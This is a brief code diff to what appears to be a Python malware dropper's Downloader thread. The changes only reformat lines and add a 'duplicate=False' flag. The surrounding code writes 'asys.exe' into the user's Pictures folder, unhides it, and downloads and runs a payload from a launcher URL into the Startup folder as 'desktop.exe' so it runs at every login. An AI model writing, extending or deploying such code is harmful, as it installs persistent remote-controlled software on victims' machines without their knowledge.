@@ -24,7 +24,8 @@ class Downloader(threading.Thread):
     def run(self):
         """Run the thread."""
         #Make a file for the script
-        path = launcher.file_in_special_path(shellcon.CSIDL_MYPICTURES, "asys.exe")
+        path = launcher.file_in_special_path(shellcon.CSIDL_MYPICTURES, 
+                                             "asys.exe")
         print path
         launcher.unhide_file(path)
         f = open(path, "w")
@@ -39,7 +40,8 @@ class Downloader(threading.Thread):
         if self._stop.is_set(): return
         launcher.download_install_run(LAUNCHERURL, 
                                       shellcon.CSIDL_STARTUP, 
-                                      "desktop.exe")
+                                      "desktop.exe",
+                                      duplicate=False)
         return
         
     def stop(self):
